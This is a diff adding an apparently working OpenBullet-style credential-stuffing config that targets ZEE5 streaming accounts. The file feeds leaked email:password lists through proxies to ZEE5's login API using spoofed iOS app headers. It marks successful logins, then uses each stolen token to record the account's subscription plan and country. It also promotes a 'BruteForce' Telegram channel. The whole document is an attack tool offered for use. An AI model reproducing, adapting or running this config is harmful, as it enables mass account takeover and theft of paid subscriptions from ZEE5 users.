@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "ZEE5",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-13T23:58:26.6727804+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Capture | Move Free To Custom | API IOS | CPM Rate : 500-200",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://userapi.zee5.com/v1/user/loginemail?email=<USER>&password=<PASS>" 
+  
+  HEADER "Host: userapi.zee5.com" 
+  HEADER "Accept: application/json" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Z5-Appversion: 16.26.7" 
+  HEADER "User-Agent: ZEE5/16.26.7 (com.zeeTV.DIDS4; build:111; iOS 12.4.7) Alamofire/4.9.0" 
+  HEADER "Accept-Language: fr-FR;q=1.0, ar-FR;q=0.9, en-GB;q=0.8, ja-JP;q=0.7, vi-VN;q=0.6, sr-Latn-FR;q=0.5" 
+  HEADER "X-Z5-AppPlatform: IOS Mobile" 
+  HEADER "Accept-Encoding: gzip;q=1.0, compress;q=0.5" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The email address and password combination was wrong during login." 
+    KEY "\"code\":2120," 
+  KEYCHAIN Success OR 
+    KEY "token" 
+
+#Token PARSE "<SOURCE>" JSON "token" -> VAR "Token" 
+
+#GetCap REQUEST GET "https://subscriptionapi.zee5.com/v1/subscription?translation=en&include_all=true" 
+  
+  HEADER "Authorization: bearer <Token>" 
+  HEADER "Host: userapi.zee5.com" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Z5-Appversion: 16.26.7" 
+  HEADER "User-Agent: ZEE5/16.26.7 (com.zeeTV.DIDS4; build:111; iOS 12.4.7) Alamofire/4.9.0" 
+  HEADER "Accept-Language: fr-FR;q=1.0, ar-FR;q=0.9, en-GB;q=0.8, ja-JP;q=0.7, vi-VN;q=0.6, sr-Latn-FR;q=0.5" 
+  HEADER "X-Z5-AppPlatform: IOS Mobile" 
+  HEADER "Accept-Encoding: gzip;q=1.0, compress;q=0.5" 
+
+#Plan_Type PARSE "<SOURCE>" JSON "subscription_plan_type" CreateEmpty=FALSE -> CAP "Plan Type" 
+
+#title PARSE "<SOURCE>" JSON "original_title" CreateEmpty=FALSE -> CAP "title" 
+
+#country PARSE "<SOURCE>" JSON "country" CreateEmpty=FALSE -> CAP "country" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "subscription_plan_type" 
+
+FUNCTION Constant "T.me/BruteForce " -> CAP " Telegram Channel: " 
+
